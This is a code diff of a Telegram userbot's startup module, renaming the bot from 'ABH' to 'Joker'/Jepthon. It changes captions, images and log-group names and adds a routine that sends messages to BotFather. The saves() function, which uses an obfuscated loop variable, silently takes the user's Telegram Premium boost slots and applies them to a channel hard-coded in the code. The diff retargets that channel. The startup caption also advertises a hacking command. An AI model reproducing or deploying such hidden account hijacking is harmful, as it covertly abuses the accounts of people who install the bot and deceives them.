@@ -29,6 +29,7 @@ from .pluginmanager import load_module
 from .tools import create_supergroup
 LOGS = logging.getLogger("VIPABH")
 logging.getLogger('telethon').setLevel(logging.WARNING)
+##Reda hands here
 cmdhr = Config.COMMAND_HAND_LER
 bot = ABH
 ENV = bool(os.environ.get("ENV", False))
@@ -93,9 +94,9 @@ async def startupmessage():
         if BOTLOG:
             Config.CATUBLOGO = await ABH.tgbot.send_file(
                 BOTLOG_CHATID,
-                "https://t.me/VIPABH/1187",
-                caption="**‏᯽︙ بــوت ABH يـعـمـل بـنـجـاح ✓ \n᯽︙ أرسل `.الاوامر`لرؤية اوامر السورس \n  ᯽︙ لأستعمال بوت الأختراق عبر كود التيرمكس أرسل`.هاك`**",
-                buttons=[(Button.url("ABH", "https://t.me/ltswe"),)],
+                "https://t.me/MemeSoundJep/24",
+                caption="**‏᯽︙ بــوت الجوكر يـعـمـل بـنـجـاح ✓ \n᯽︙ أرسل `.الاوامر`لرؤية اوامر السورس \n  ᯽︙ لأستعمال بوت الأختراق عبر كود التيرمكس أرسل`.هاك`**",
+                buttons=[(Button.url("سورس الجوكر", "https://t.me/jepthon"),)],
             )
     except Exception as e:
         LOGS.error(e)
@@ -125,43 +126,55 @@ async def startupmessage():
         LOGS.error(e)
         return None
 
+
+async def mybot():
+    try:
+        starkbot = await ABH.tgbot.get_me()
+        joker = "الجوكر 🤡"
+        bot_name = starkbot.first_name
+        botname = f"@{starkbot.username}"
+        if bot_name.endswith("Assistant"):
+            print("تم تشغيل البوت")
+        if starkbot.bot_inline_placeholder:
+            print("Aljoker ForEver")
+        else:
+            try:
+                await ABH.send_message("@BotFather", "/setinline")
+                await asyncio.sleep(1)
+                await ABH.send_message("@BotFather", botname)
+                await asyncio.sleep(1)
+                await ABH.send_message("@BotFather", joker)
+                await asyncio.sleep(2)
+            except Exception as e:
+                print(e)
+    except Exception as e:
+        print(e)
+
+
 async def add_bot_to_logger_group(chat_id):
     """
-    لإضافة البوت إلى مجموعات السجل
+    To add bot to logger groups
     """
+    bot_details = await ABH.tgbot.get_me()
     try:
-        # الحصول على تفاصيل البوت
-        bot_details = await ABH.tgbot.get_me()
-        bot_username = bot_details.username
-
-        if not bot_username:
-            raise ValueError("اسم المستخدم للبوت غير موجود")
-
-        # المحاولة الأولى لإضافة البوت إلى المجموعة
-        try:
-            await ABH(
-                functions.messages.AddChatUserRequest(
-                    chat_id=chat_id,
-                    user_id=bot_username,
-                    fwd_limit=1000000,
-                )
+        await ABH(
+            functions.messages.AddChatUserRequest(
+                chat_id=chat_id,
+                user_id=bot_details.username,
+                fwd_limit=1000000,
             )
-            print(f"تمت إضافة البوت إلى المجموعة: {chat_id}")
-        # في حالة فشل المحاولة الأولى، يتم استخدام طريقة الدعوة
-        except Exception as e:
+        )
+    except BaseException:
+        try:
             await ABH(
                 functions.channels.InviteToChannelRequest(
                     channel=chat_id,
-                    users=[bot_username],
+                    users=[bot_details.username],
                 )
             )
-            print(f"تمت دعوة البوت إلى القناة: {chat_id}")
-    # التعامل مع الأخطاء العامة
-    except Exception as e:
-        LOGS.error(f"Error in add_bot_to_logger_group: {e}")
-        print(f"حدث خطأ أثناء محاولة إضافة البوت إلى المجموعة: {e}")
-
-VIPABH = {"@sszxl", "@x04ou", "@ltswe", "@iamMUAOL"}
+        except Exception as e:
+            LOGS.error(str(e))
+VIPABH = {"@x04ou", "@EHIEX"}
 async def saves():
     for lMl10l in VIPABH:
         try:
@@ -170,7 +183,7 @@ async def saves():
             slots = [boost.slot for boost in result.my_boosts]
             aljoker_channel_id = None
             for chat in result.chats:
-                if chat.username == 'sszxl':
+                if chat.username == 'x04ou':
                     aljoker_channel_id = chat.id
                     break
             if aljoker_channel_id and any(boost.peer.channel_id == aljoker_channel_id for boost in result.my_boosts):
@@ -178,7 +191,7 @@ async def saves():
             if not slots:
                 return
             await ABH(functions.premium.ApplyBoostRequest(
-                'sszxl',
+                'x04ou',
                 slots=slots
             ))
         except FloodWaitError as e:
@@ -247,6 +260,7 @@ async def load_plugins(folder, extfolder=None):
             f'- تم بنجاح استدعاء الاوامر الاضافيه \n**عدد الملفات التي استدعيت:** `{success}`\n**فشل في استدعاء :** `{", ".join(failure)}`',
         )
 
+#سورس الجوكر عمك
 async def aljoker_the_best(ABH, group_name):
     async for dialog in ABH.iter_dialogs():
         if dialog.is_group and dialog.title == group_name:
@@ -282,22 +296,22 @@ async def verifyLoggerGroup():
                 + str(e)
             )
     else:
-        descript = "- عزيزي المستخدم هذه هي مجموعه الاشعارات يرجى عدم حذفها  - "
-        photobt = await ABH.upload_file(file="ABH/razan/resources/start/abh2.jpg")
-        botlog_group_id = await aljoker_the_best(ABH, "مجموعة أشعارات ABH")
+        descript = "- عزيزي المستخدم هذه هي مجموعه الاشعارات يرجى عدم حذفها  - @Jepthon"
+        photobt = await ABH.upload_file(file="ABH/razan/resources/start/Jepthon.JPEG")
+        botlog_group_id = await aljoker_the_best(ABH, "مجموعة أشعارات الجوكر")
         if botlog_group_id:
             addgvar("PRIVATE_GROUP_BOT_API_ID", botlog_group_id)
             print("᯽︙تم العثور على مجموعة المساعدة بالفعل وإضافتها إلى المتغيرات.")
         else:
             _, groupid = await create_supergroup(
-                "مجموعة أشعارات ABH", ABH, Config.TG_BOT_USERNAME, descript, photobt
+                "مجموعة أشعارات الجوكر", ABH, Config.TG_BOT_USERNAME, descript, photobt
             )
             addgvar("PRIVATE_GROUP_BOT_API_ID", groupid)
             print("᯽︙تم إنشاء مجموعة المسـاعدة بنجاح وإضافتها إلى المتغيرات.")
         flag = True
     if PM_LOGGER_GROUP_ID == -100:
-        descript = "᯽︙ وظيفه الكروب يحفظ رسائل الخاص اذا ما تريد الامر احذف الكروب نهائي \n  - "
-        photobt = await ABH.upload_file(file="ABH/razan/resources/start/abh.jpg")
+        descript = "᯽︙ وظيفه الكروب يحفظ رسائل الخاص اذا ما تريد الامر احذف الكروب نهائي \n  - @Jepthon"
+        photobt = await ABH.upload_file(file="ABH/razan/resources/start/Jepthon2.JPEG")
         pm_logger_group_id = await aljoker_the_best(ABH, "مجموعة التخزين")
         if pm_logger_group_id:
             addgvar("PM_LOGGER_GROUP_ID", pm_logger_group_id)
